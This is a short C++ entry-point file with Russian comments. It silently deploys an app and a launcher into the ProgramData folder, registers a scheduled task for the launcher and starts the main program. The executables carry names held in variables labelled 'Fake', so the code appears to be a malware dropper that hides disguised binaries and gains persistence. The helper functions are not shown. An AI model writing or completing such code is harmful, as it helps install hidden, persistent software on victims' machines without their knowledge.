#include <iostream>
#include "functions.h"

int main(){
    std::wstring base = GetProgramDataPath();
    if (base.empty()) return 1;

    // Формируем полный путь к нашей папке
    std::filesystem::path securePathToAppDir;
    std::filesystem::path securePathToLauncherDir;



    PrepareAppFolder(base, securePathToAppDir ); // тут secure path изменится по ссылке
    PrepareLauncherFolder(base, securePathToLauncherDir);

    if (!CheckAppFiles(securePathToAppDir)){
        if (DeployApp(securePathToAppDir)) {
            std::cout << "deployed" << std::endl;
        }else {
            std::cout << "not deployed" << std::endl;
        }
    }

    if (!CheckLauncherFiles(securePathToLauncherDir)){
        if (DeployLauncher(securePathToLauncherDir)) {
            std::cout << "deployed" << std::endl;
        }else {
            std::cout << "not deployed" << std::endl;
        }
    }

    const std::filesystem::path pathLauncherExe = securePathToLauncherDir / g_FakeLauncherNameAtLauncher;

    // std::cout << pathLauncherExe.string() << std::endl;

    RegisterTaskXML(pathLauncherExe);
    // запускаем
    StartProcess(securePathToAppDir / g_FakeMainNameAtMain);
    return 0;
}